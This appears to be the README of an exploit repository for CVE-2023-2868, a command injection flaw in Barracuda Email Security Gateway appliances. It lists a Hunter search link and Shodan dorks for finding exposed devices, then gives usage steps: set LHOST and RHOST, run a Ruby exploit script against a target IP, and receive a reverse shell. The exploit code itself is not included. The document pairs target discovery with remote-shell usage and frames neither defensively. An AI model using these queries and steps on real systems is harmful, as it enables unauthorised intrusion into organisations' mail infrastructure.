# CVE-2023-2868
Barracuda ESG Command Injection 
- [Hunter Search Link](https://hunter.how/list?searchValue=product.name%3D%22Barracuda%20Networks%20Spam%20Firewall%20smtpd%22)

- Shodan dorks:
```
product:"Barracuda Networks Spam Firewall smtpd"
```
```
http.waf:"Barracuda (Barracuda Networks)"
```
```
html:app_common::nonetwork.title
```
- Usage

Set LHOST and RHOST variables to your listener.

```
ruby exploit.rb <TARGET_IP>
```

This will spawn a reverse shell.
